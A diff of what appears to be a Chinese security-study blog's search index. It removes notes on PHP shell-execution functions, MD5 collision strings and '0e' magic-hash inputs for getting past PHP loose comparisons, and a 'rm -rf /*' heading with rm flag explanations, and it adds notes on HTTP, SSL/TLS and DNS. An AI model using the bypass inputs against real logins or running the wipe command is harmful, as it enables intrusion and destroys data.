-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">passthru(<span class="string">&#x27;ls&#x27;</span>,<span class="variable">$retval</span>);</span><br><span class="line"><span class="comment">//没有返回值。</span></span><br><span class="line"><span class="comment">//如果有$retval参数(int类型)，返回内容保存到$retval中。</span></span><br></pre></td></tr></table></figure>
-
-<p>3.exec() 不输出结果，返回最后一行shell结果，所有结果可以保存到一个返回的数组里面。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">exec(<span class="string">&#x27;ls&#x27;</span>,<span class="variable">$output</span>,<span class="variable">$retval</span>);</span><br><span class="line"><span class="comment">//$output为array类型</span></span><br><span class="line"><span class="comment">//$retval为int类型</span></span><br></pre></td></tr></table></figure>
-
-<p>如果提供了$output 参数，那么会用命令执行的输出填充此数组，每行输出填充数组中的一个元素。 数组中的数据不包含行尾的空白字符，例如 \n字符。请注意，如果数组中已经包含了部分元素，exec()函数会在数组末尾追加内容。</p>
-<p>4.popen() 打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。  </p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$handle</span> = popen(<span class="string">&quot;/bin/ls&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="comment">//前面为命令，后面为模式，模式分为只读和只写。</span></span><br><span class="line"><span class="comment">//只写(打开并清空已有文件或者创建一个新文件夹)</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>出错返回false，在php3后续版本支持可读可写，但需要使用pclose()关闭。(除非这个句柄是以一种模式打开的)</p>
-<p>5.shell_exec()通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">shell_exec(<span class="variable">$cmd</span>);</span><br></pre></td></tr></table></figure>
-
-<p>发生错误或者进程不产生输出，则返回 null。</p>
-<p>6.proc_open() 执行一个命令，并且打开用来输入/输出的文件指针。类似popen()函数，但是proc_open()提供了更强大的控制程序执行的能力。(不常用)</p>
-<p>7.pcntl_exec() 在当前进程空间执行指定程序。(不常用)</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>特殊的md5值</title>
-    <url>/2022/01/06/%E6%9D%82%E9%A1%B9/%E7%89%B9%E6%AE%8A%E7%9A%84md5%E5%80%BC/</url>
-    <content><![CDATA[<h3 id="三个相同MD5值的字符串-字符串不同，细微区别"><a href="#三个相同MD5值的字符串-字符串不同，细微区别" class="headerlink" title="三个相同MD5值的字符串(字符串不同，细微区别):"></a>三个相同<code>MD5</code>值的字符串(字符串不同，细微区别):</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$s1</span> = <span class="string">&quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&quot;</span>;</span><br><span class="line"><span class="variable">$s2</span> = <span class="string">&quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab&quot;</span>;</span><br><span class="line"><span class="variable">$s3</span> = <span class="string">&quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%ed%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%a7%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%e6%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%16%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%33%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%6f%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&quot;</span>;</span><br><span class="line">var_dump(md5(urldecode(<span class="variable">$s1</span>)));</span><br><span class="line">var_dump(md5(urldecode(<span class="variable">$s2</span>)));</span><br><span class="line">var_dump(md5(urldecode(<span class="variable">$s3</span>)));</span><br></pre></td></tr></table></figure>
-
-<span id="more"></span>
-
-<h3 id="三个相同MD5值的字符串-字符串不同，细微区别-1"><a href="#三个相同MD5值的字符串-字符串不同，细微区别-1" class="headerlink" title="三个相同MD5值的字符串(字符串不同，细微区别):"></a>三个相同<code>MD5</code>值的字符串(字符串不同，细微区别):</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$s1</span> = <span class="string">&quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&quot;</span>;</span><br><span class="line"><span class="variable">$s2</span> = <span class="string">&quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab&quot;</span>;</span><br><span class="line"><span class="variable">$s3</span> = <span class="string">&quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%ed%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%a7%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%e6%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%16%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%33%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%6f%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&quot;</span>;</span><br><span class="line">var_dump(md5(urldecode(<span class="variable">$s1</span>)));</span><br><span class="line">var_dump(md5(urldecode(<span class="variable">$s2</span>)));</span><br><span class="line">var_dump(md5(urldecode(<span class="variable">$s3</span>)));</span><br></pre></td></tr></table></figure>
-
-<p>运行结果：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span>(<span class="number">32</span>) <span class="string">&quot;ea8b4156874b91a4ef00c5ca3e4a4a34&quot;</span></span><br><span class="line"><span class="keyword">string</span>(<span class="number">32</span>) <span class="string">&quot;ea8b4156874b91a4ef00c5ca3e4a4a34&quot;</span></span><br><span class="line"><span class="keyword">string</span>(<span class="number">32</span>) <span class="string">&quot;ea8b4156874b91a4ef00c5ca3e4a4a34&quot;</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="一个5位数和一个6位数的0e开头md5全数字的值"><a href="#一个5位数和一个6位数的0e开头md5全数字的值" class="headerlink" title="一个5位数和一个6位数的0e开头md5全数字的值"></a>一个5位数和一个6位数的0e开头md5全数字的值</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">byGcY</span><br><span class="line"><span class="number">0e591948146966052067035298880982</span></span><br><span class="line">sonZ7y</span><br><span class="line"><span class="number">0e463306343746311593316642162425</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="只包含一种字符的0e开头的md5值："><a href="#只包含一种字符的0e开头的md5值：" class="headerlink" title="只包含一种字符的0e开头的md5值："></a>只包含一种字符的0e开头的md5值：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>FVWc</span><br><span class="line"><span class="number">0</span>ef715f5943144181839f9f321584156</span><br><span class="line"><span class="number">2</span>uM8z</span><br><span class="line"><span class="number">0e0081018231</span>f666742748f3540f4761</span><br><span class="line"><span class="number">3</span>za1b</span><br><span class="line"><span class="number">0e02</span>f196724391824188f3f90f732735</span><br></pre></td></tr></table></figure>
-
-<h3 id="只包含两种字符的0e开头的md5值："><a href="#只包含两种字符的0e开头的md5值：" class="headerlink" title="只包含两种字符的0e开头的md5值："></a>只包含两种字符的0e开头的md5值：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">00</span>c84</span><br><span class="line"><span class="number">0e17</span>d931d17f1948d37d691693995ff1</span><br><span class="line"><span class="number">01</span>bDI</span><br><span class="line"><span class="number">0</span>ee26113820055502806791698800f47</span><br><span class="line"><span class="number">01</span>NxP</span><br><span class="line"><span class="number">0e72096</span>d884f956d9618012679405269</span><br><span class="line"><span class="number">02</span>K7w</span><br><span class="line"><span class="number">0e543091322</span>e0f42ef1126374409f755</span><br><span class="line"><span class="number">04072</span></span><br><span class="line"><span class="number">0e8</span>f06d06387944ff396030861fd2698</span><br><span class="line"><span class="number">044</span>Dt</span><br><span class="line"><span class="number">0e91946379408</span>e6f2f62152293e4f596</span><br><span class="line"><span class="number">05</span>nnu</span><br><span class="line"><span class="number">0</span>ef580f7a2f4176f57544f8091f33936</span><br><span class="line"><span class="number">05</span>wPJ</span><br><span class="line"><span class="number">0e49528768</span>d18f101816843669079475</span><br></pre></td></tr></table></figure>
-
-<h3 id="下列的字符串的MD5值都是0e开头的："><a href="#下列的字符串的MD5值都是0e开头的：" class="headerlink" title="下列的字符串的MD5值都是0e开头的："></a>下列的字符串的<code>MD5</code>值都是<code>0e</code>开头的：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">240610708</span><br><span class="line">s878926199a</span><br><span class="line">s155964671a</span><br><span class="line">s214587387a</span><br><span class="line">s214587387a</span><br></pre></td></tr></table></figure>
-
-<p>为什么是以<code>0e</code>开头的<code>md5</code>值？(前提<code>==</code>号，而不是<code>===</code>)科学计数法中<code>0e123</code>和<code>0e456</code>是相同的，因为0乘以任何数都是<code>0</code>。</p>
-<ul>
-<li>== 两边值类型不同的时候，要先进行类型转换，再比较。</li>
-<li>=== 不做类型转换，类型不同的一定不等。</li>
+<h3 id="HTTP不安全因素"><a href="#HTTP不安全因素" class="headerlink" title="HTTP不安全因素"></a><code>HTTP</code>不安全因素</h3><ul>
+<li>通信使用明文(内容可能被<strong>窃听</strong>)。</li>
+<li>不验证通信方身份(有可能遭遇<strong>伪装</strong>)。</li>
+<li>无法验证报文的完整性(报文有可能已经遭遇<strong>篡改</strong>)。</li>
 </ul>
-<p>转载自:<a href="https://blog.csdn.net/qq_42967398/article/details/104522626">https://blog.csdn.net/qq_42967398/article/details/104522626</a></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>一些小知识</title>
-    <url>/2022/01/06/%E6%9D%82%E9%A1%B9/%E4%B8%80%E4%BA%9B%E5%B0%8F%E7%9F%A5%E8%AF%86/</url>
-    <content><![CDATA[<h2 id="MIME是什么"><a href="#MIME是什么" class="headerlink" title="MIME是什么?"></a><code>MIME</code>是什么?</h2><p><code>MIME</code>意为多功能<code>Internet</code>邮件扩展，它设计的最初目的是为了在发送电子邮件时附加多媒体数据，让邮件客户程序能根据其类型进行处理。</p>
-<p>文件后缀名在网页上并没有明确的意义。 因此，使服务器设置正确的传输类型非常重要，所以正确的<code>MIME</code>类型与每个文件一同传输给服务器。在网络资源进行连接时，浏览器经常使用<code>MIME</code>类型来决定执行何种默认行为。</p>
-<span id="more"></span>
+<h2 id="SSL协议简介"><a href="#SSL协议简介" class="headerlink" title="SSL协议简介"></a>SSL协议简介</h2><h3 id="SSL协议的定义"><a href="#SSL协议的定义" class="headerlink" title="SSL协议的定义"></a><code>SSL</code>协议的定义</h3><p>安全套接字（<code>Secure Socket Layer，SSL</code>）协议是<code>Web</code>浏览器与<code>Web</code>服务器之间安全交换信息的协议，提供两个基本的安全服务：鉴别与保密。</p>
+<p>SSL协议位于TCP协议与各种应用层之间，为数据通信提供数据加密、服务器认真、消息完整性以及可选的客户机认证。</p>
+<p>SSL协议可以分为两层:</p>
+<ul>
+<li>SSL记录协议: 它建立在可靠的传输协议(如:TCP)之上，为高层协议提供数据封装、压缩、加密等基本功能的支持。</li>
+<li>SSL握手协议: 它建立在SSL记录协议基础之上，用与于在实际的数据传输开始前，通讯双方进行身份认证、协商加密算法、交换密钥等。</li>
+</ul>
+<p><code>TLS</code>: <code>SSL</code>更新到3.0时，<code>IETF</code>对3.0进行了标准化，并添加了少数机制(但是几乎和<code>SSL3.0</code>无差异)。主要目标是使<code>SSL</code>更安全。</p>
+<h3 id="SSL协议的特性"><a href="#SSL协议的特性" class="headerlink" title="SSL协议的特性"></a><code>SSL</code>协议的特性</h3><ul>
+<li>保密：在握手协议中定义了会话密钥后，所有的消息都被加密。</li>
+<li>鉴别：可选的客户端认证，和强制的服务器端认证。</li>
+<li>完整性：传送的消息包括消息完整性检查（使用<code>MAC</code>）。</li>
+</ul>
+<p><code>HTTPS</code> = <code>HTTP</code> + <code>TLS</code>/<code>SSL</code></p>
+<h2 id="DNS协议简介"><a href="#DNS协议简介" class="headerlink" title="DNS协议简介"></a>DNS协议简介</h2><h3 id="DNS协议的定义"><a href="#DNS协议的定义" class="headerlink" title="DNS协议的定义"></a><code>DNS</code>协议的定义</h3><p><code>DNS</code>协议是域名系统(<code>Domian Name System</code>)的缩写，就是<strong>用来将域名解析到<code>IP</code>地址的一种协议。</strong></p>
+<p><strong><code>DNS</code>协议基于<code>UDP</code>和<code>TCP</code>协议的，端口号53，用户到服务器采用<code>UDP</code>协议，<code>DNS</code>服务器通信采用<code>TCP</code>协议。</strong></p>
+<h3 id="DNS系统的组成"><a href="#DNS系统的组成" class="headerlink" title="DNS系统的组成"></a><code>DNS</code>系统的组成</h3><ul>
+<li>域名空间和资源记录。</li>
+<li>域名服务器: 提供域名空间结构及信息的服务器程序。</li>
+<li>解析器: 应客户程序的要求从域名服务器抽取信息。</li>
+</ul>
+<p>域名空间被设计为树状结构</p>
+<img src="/2022/03/12/%E6%9D%82%E9%A1%B9/tw0/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80/image-20220113233219198.png" class="" title="image-20220113233219198">
 
-<h2 id="MIME是什么-1"><a href="#MIME是什么-1" class="headerlink" title="MIME是什么?"></a><code>MIME</code>是什么?</h2><p><code>MIME</code>意为多功能<code>Internet</code>邮件扩展，它设计的最初目的是为了在发送电子邮件时附加多媒体数据，让邮件客户程序能根据其类型进行处理。</p>
-<p>文件后缀名在网页上并没有明确的意义。 因此，使服务器设置正确的传输类型非常重要，所以正确的<code>MIME</code>类型与每个文件一同传输给服务器。在网络资源进行连接时，浏览器经常使用<code>MIME</code>类型来决定执行何种默认行为。</p>
-<p>是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会<strong>自动使用</strong>指定应用程序来打开。多用于指定一些客户端<strong>自定义</strong>的文件名，以及一些媒体文件打开方式。</p>
-<h3 id="MIME嗅探"><a href="#MIME嗅探" class="headerlink" title="MIME嗅探"></a><code>MIME</code>嗅探</h3><p>在缺失<code> MIME</code> 类型或客户端认为文件设置了错误的 <code>MIME</code> 类型时，浏览器可能会通过查看资源来进行<code>MIME</code>嗅探。每一个浏览器在不同的情况下会执行不同的操作。因为这个操作会有一些安全问题，有的 <code>MIME </code>类型表示可执行内容而有些是不可执行内容。浏览器可以通过请求头 <code>Content-Type</code> 来设置 <code>X-Content-Type-Options</code> 以阻止<code>MIME</code>嗅探。</p>
-<h2 id="robots协议？"><a href="#robots协议？" class="headerlink" title="robots协议？"></a><code>robots</code>协议？</h2><p><code>robots</code>协议也叫<code>robots.txt</code>（统一小写）是一种存放于网站根目录下的ASCII编码的文本文件，它通常告诉网络搜索引擎的漫游器（又称网络蜘蛛），此网站中的哪些内容是不应被搜索引擎的漫游器获取的，哪些是可以被漫游器获取的。因为一些系统中的URL是大小写敏感的，所以<code>robots.txt</code>的文件名应统一为<strong>小写</strong>。<code>robots.txt</code>应放置于网站的根目录下。</p>
-<p><strong><code>robots</code>协议并不是一个规范，而只是约定俗成的，所以并不能保证网站的隐私。</strong></p>
-<h2 id="后缀为-phps的文件是什么？"><a href="#后缀为-phps的文件是什么？" class="headerlink" title="后缀为.phps的文件是什么？"></a>后缀为<code>.phps</code>的文件是什么？</h2><p><code>phps</code>文件是php的源代码文件，通常用于提供给用户（访问者）查看php代码，因为用户无法直接通过Web浏览器看到php文件的内容，所以需要用<code>phps</code>文件代替。(其实，只要不用php等已经在服务器中注册过的MIME类型为文件即可，但为了国际通用，所以才用了<code>phps</code>文件类型。)</p>
-<p>但并不是所有php文件都有<code>.phps</code>后缀文件</p>
-<h2 id="htaccess文件是什么？"><a href="#htaccess文件是什么？" class="headerlink" title=".htaccess文件是什么？"></a><code>.htaccess</code>文件是什么？</h2><p><code>.htaccess</code>是一个配置文件(纯文本文件)，里面存放着<code>Apache</code>服务器配置相关的一些指令，它类似于Apache的站点配置文件，如<code>httpd.conf</code>（<code>Apache2</code>已经支持多站点，因此你的站点配置文件可能在<code>/etc/apache2/conf.d/</code>目录下）。</p>
-<p><code>.htaccess</code>与<code>httpd.conf</code>配置文件不同的是，它只作用于当前目录。另外<code>httpd.conf</code>是在<code>Apache</code>服务启动的时候就加载的，而<code>.htaccess</code>只有在用户访问目录时加载，开销大、速度慢。</p>
-<p>既然如此，为什么我们还要用<code>.htaccess</code>呢？因为它配置起来简单，它还支持网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能，另外它管理起来很方便，可以很好适应网站迁移。</p>
-<h2 id="Tor浏览器"><a href="#Tor浏览器" class="headerlink" title="Tor浏览器"></a>Tor浏览器</h2><p>一款是你匿名访问网络的的软件。用户通过<code>Tor</code>可以在因特网上进行匿名交流。(基于火狐浏览器的浏览器)，后缀为<code>onion</code>的网站需要用此浏览器访问。</p>
-<p>为了实现匿名目的，<code>Tor</code>把分散在全球的计算机集合起来形成一个加密回路。当你通过<code>Tor</code>网络访问互联网时，你的网络数据会通过多台电脑迂回发送，就像洋葱包裹其核心那样掩饰你的网络活动，信息传输在每一步都被加密，无从得知你所处位置和信息传输目的地。因此<code>Tor Browser</code>也被称为洋葱浏览器。</p>
-<h2 id="移位计算的一个特殊值"><a href="#移位计算的一个特殊值" class="headerlink" title="移位计算的一个特殊值"></a>移位计算的一个特殊值</h2><p>125&lt;&lt;3 = 1000</p>
-<p>0111 1101 &lt;&lt; 后为 0011 1110 1000 的十进制为1000</p>
-<p>同理8000&gt;&gt;3 =1000</p>
+<p>eg :<code>www.baidu.com</code></p>
+<ol>
+<li><code>com</code>: 一级域名. 表示这是一个企业域名。同级的还有 “net”(网络提供商), “<code>org</code>”(⾮非盈利组织) 等。</li>
+<li><code>baidu</code>: 二级域名，指公司名。</li>
+<li><code>www</code>: 只是一种习惯用法。</li>
+</ol>
+<h3 id="域名服务器"><a href="#域名服务器" class="headerlink" title="域名服务器"></a>域名服务器</h3><p>由高向低进行层次划分，可分为以下几大类：</p>
 <table>
 <thead>
 <tr>
-<th>HEX</th>
-<th>3E8</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>DEC</td>
-<td>1,000</td>
-</tr>
-<tr>
-<td>OCT</td>
-<td>1750</td>
-</tr>
-<tr>
-<td>BIN</td>
-<td>0011 1110 1000</td>
-</tr>
-</tbody></table>
-<h2 id="删库跑路-rm-rf"><a href="#删库跑路-rm-rf" class="headerlink" title="删库跑路  rm -rf /*"></a>删库跑路  <code>rm -rf /*</code></h2><p><code>rm </code>命令可以删除一个目录中的一个或多个文件或目录，也可以将某个目录及其下属的所有文件及其子目录均删除掉</p>
-<table>
-<thead>
-<tr>
-<th>命令</th>
+<th>分类</th>
 <th>作用</th>
 </tr>
 </thead>
 <tbody><tr>
-<td>-f</td>
-<td>强制删除文件或目录</td>
+<td>根域名服务器</td>
+<td>最高层次的域名服务器，本地域名服务器解析不了的域名就会向其求助</td>
 </tr>
